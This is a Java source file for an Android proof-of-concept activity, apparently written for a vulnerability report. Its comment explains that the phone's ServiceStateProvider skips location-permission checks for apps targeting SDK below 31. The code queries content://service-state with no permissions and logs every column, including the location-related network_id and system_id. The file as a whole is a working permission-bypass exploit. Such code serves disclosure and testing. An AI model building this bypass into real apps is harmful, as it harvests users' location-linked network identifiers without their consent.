package com.vrp.lowsdk;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

// com.android.phone's ServiceStateProvider (content://service-state) gates full-column
// access (ALL_COLUMNS, including the LOCATION_PROTECTED_COLUMNS_SET fields network_id and
// system_id -- CDMA cell/network identifiers) behind a compat-change
// (ENFORCE_LOCATION_PERMISSION_CHECK) that ONLY applies when the CALLING app's own
// targetSdkVersion >= 31 (TelephonyPermissions.getTargetSdk(...) >= 31). Below that, the
// entire location-permission redaction branch is skipped and ALL_COLUMNS is returned
// unconditionally with zero permissions. This PoC targets SDK 28 to test the bypass.
public class ServiceStateLeakActivity extends Activity {
    private static final String T = "SERVICESTATE_LEAK";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            PackageManager pm = getPackageManager();
            Log.w(T, "targetSdkVersion=" + pm.getApplicationInfo(getPackageName(), 0).targetSdkVersion);
        } catch (Exception e) {
            Log.w(T, "pm error: " + e);
        }
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions, low targetSdk)");

        Uri uri = Uri.parse("content://service-state");
        try (Cursor c = getContentResolver().query(uri, null, null, null, null)) {
            if (c == null) {
                Log.w(T, "query returned null cursor");
                return;
            }
            Log.w(T, "columnCount=" + c.getColumnCount());
            Log.w(T, "columns=" + java.util.Arrays.toString(c.getColumnNames()));
            if (c.moveToFirst()) {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < c.getColumnCount(); i++) {
                    sb.append(c.getColumnName(i)).append("=").append(c.getString(i)).append(" | ");
                }
                Log.w(T, "ROW: " + sb);
            } else {
                Log.w(T, "cursor empty (moveToFirst=false)");
            }
        } catch (Exception e) {
            Log.w(T, "query threw: " + e);
        }
    }
}
